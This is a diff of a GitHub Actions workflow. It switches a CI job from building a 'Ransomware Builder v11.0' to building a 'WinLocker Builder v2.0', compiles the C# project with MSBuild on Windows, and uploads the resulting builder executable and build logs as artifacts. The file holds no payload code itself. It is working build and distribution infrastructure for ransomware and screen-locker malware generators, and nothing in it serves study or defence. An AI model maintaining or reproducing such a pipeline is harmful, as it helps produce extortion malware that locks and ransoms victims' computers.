@@ -1,4 +1,4 @@
-name: Build Ransomware Builder v11.0 (C# Compiler)
+name: Build WinLocker Builder v2.0
 
 on:
   push:
@@ -10,31 +10,48 @@ jobs:
     runs-on: windows-latest
     
     steps:
-    - name: Checkout
+    - name: Checkout code
       uses: actions/checkout@v4
     
     - name: Setup MSBuild
       uses: microsoft/setup-msbuild@v2
     
+    - name: Setup .NET Framework
+      run: |
+        echo "Setting up .NET Framework..."
+        # .NET Framework уже установлен на windows-latest
+    
     - name: Restore NuGet packages
       run: |
-        dotnet restore builder.csproj --runtime win-x86
+        dotnet restore WinLockerBuilder.csproj --runtime win-x86
     
-    - name: Build Builder
+    - name: Build WinLocker Builder
       run: |
-        msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
+        msbuild WinLockerBuilder.csproj /p:Configuration=Release /p:Platform="Any CPU" /p:TargetFramework=net48
         
-        if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
-          Write-Host "=== Build SUCCESS ==="
-          Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
-          Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v11_CSharp.exe"
+        # Проверяем результат сборки
+        if (Test-Path "bin\Any CPU\Release\net48\WinLockerBuilder.exe") {
+          Write-Host "=== Build SUCCESS ===" -ForegroundColor Green
+          Get-ChildItem "bin\Any CPU\Release\net48\WinLockerBuilder.exe" | Format-Table -AutoSize
+          Copy-Item "bin\Any CPU\Release\net48\WinLockerBuilder.exe" "WinLockerBuilder_v2.exe"
         } else {
-          Write-Host "=== Build FAILED ==="
+          Write-Host "=== Build FAILED ===" -ForegroundColor Red
           exit 1
         }
     
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
-        name: RansomwareBuilder_v11_CSharp
-        path: RansomwareBuilder_v11_CSharp.exe
+        name: WinLockerBuilder_v2
+        path: WinLockerBuilder_v2.exe
+    
+    - name: Upload Debug Info
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: build-logs
+        path: |
+          **/*.log
+          **/*.xml
+          **/bin/
+          **/obj/
